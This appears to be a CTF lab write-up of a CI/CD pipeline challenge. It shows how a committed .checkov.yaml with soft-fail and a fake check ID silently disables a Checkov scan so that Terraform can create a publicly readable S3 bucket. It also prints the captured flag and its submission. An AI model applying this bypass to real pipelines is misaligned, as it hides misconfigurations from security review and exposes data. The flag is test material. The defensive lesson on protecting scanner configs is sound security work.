# F-021: Checkov SAST Config Override Enables Undetected IaC Misconfiguration (Dodo / flag7)

**SEVERITY: HIGH**

| Field | Detail |
|---|---|
| Affected Asset | Jenkins job `wonderland-dodo`, `Wonderland/dodo` Gitea repo, LocalStack S3 bucket `dodo` |
| OWASP CI/CD Mapping | **CICD-SEC-1** (Insufficient Flow Control Mechanisms) — the security gate (Checkov) can be bypassed by the same contributor whose code it is supposed to scan · CICD-SEC-8 (Ungoverned Usage of 3rd Party Services) — LocalStack S3 represents a cloud resource whose security posture is gated only by in-pipeline checks |
| Status | CONFIRMED, CTFd-verified (flag7) |

## Discovery

The Dodo challenge's `config.xml` (read via [CVE-2024-23897](./F-016-CVE-2024-23897-jenkins-cli-arbitrary-file-read.md)) revealed a pipeline with two stages: a Checkov static-analysis scan of Terraform files checking for specific misconfigurations (including `CKV_AWS_20`, the public S3 ACL check), followed by a `terraform apply` to LocalStack, and a final ACL check that prints `flag7` only if the S3 bucket is publicly readable. The intended attack: make the `dodo` bucket publicly readable **without** Checkov detecting it.

## Investigation — Terraform Drift Fight (Instructive Dead End)

Initial approach: set the bucket ACL to `public-read` out-of-band (via AWS CLI on `agent1`) and then trigger the pipeline. This worked exactly once before Terraform applied and silently reverted the change (`Resources: 0 added, 1 changed, 0 destroyed` — Terraform treated the out-of-band change as drift to correct). Removing the `acl` attribute from the Terraform resource entirely stopped the reversion, but then the out-of-band setting still wasn't seen by the Checkov check due to a credential/region mismatch in how `awslocal` was invoked.

**Lesson:** in real IaC environments, fighting Terraform's state reconciliation via out-of-band changes is always a losing battle — the correct attack surface is the Terraform configuration itself or the pipeline's security gates.

## Exploitation

The correct approach (confirmed against the official CICD-Goat solution):

1. **Explicitly declare the public ACL in Terraform** (`acl = "public-read"`), which makes Terraform itself set the bucket public.
2. **Override Checkov's configuration file to blind it** — a `.checkov.yaml` in the repository root takes precedence over command-line arguments, and by setting `soft-fail: true` and pointing to a nonexistent check ID, Checkov is silently disarmed while still appearing to run normally in the pipeline output.

```hcl
# main.tf - dodo bucket resource with explicit public-read ACL
resource "aws_s3_bucket" "dodo" {
  bucket = var.bucket_name
  acl    = "public-read"
  # ...
}
```

```yaml
# .checkov.yaml - overrides the CLI scan to check only a nonexistent check ID
soft-fail: true
check:
  - MY_CHECK
```

With `soft-fail: true` and a fake check ID, Checkov runs, finds nothing to check, exits `0` (success), and the pipeline proceeds to `terraform apply`. The bucket is created public-read by Terraform itself (not out-of-band). The final ACL check detects the `AllUsers READ` grant and prints `flag7`:

```
+ res={
  "Grantee": {"Type": "Group","URI": "http://acs.amazonaws.com/groups/global/AllUsers"},
  "Permission": "READ"
}
+ decoded=A62F0E52-7D67-410E-8279-32447ADAD916
+ echo FLAG7: A62F0E52-7D67-410E-8279-32447ADAD916
FLAG7: A62F0E52-7D67-410E-8279-32447ADAD916
```

```
POST /api/v1/challenges/attempt {"challenge_id":7,"submission":"A62F0E52-7D67-410E-8279-32447ADAD916"}
-> {"status":"correct"}
```

## Interview Talking Point

This is an important class of finding that often gets overlooked: a security tool's configuration file checked into the same repository as the code it scans is controllable by the same contributor the tool is supposed to audit. This applies broadly: `.checkov.yaml`, `.tflint.hcl`, `.semgrepignore`, `.eslintignore`, SonarQube exclusion configs, and similar files can all silently disable or weaken security checks when committed alongside the code. Security scanning tools should either read their configuration from a source the code contributor cannot modify (a separate, protected repo or a CI-platform-level configuration), or the scan result should be verified by a system that validates the config file itself was not tampered with.
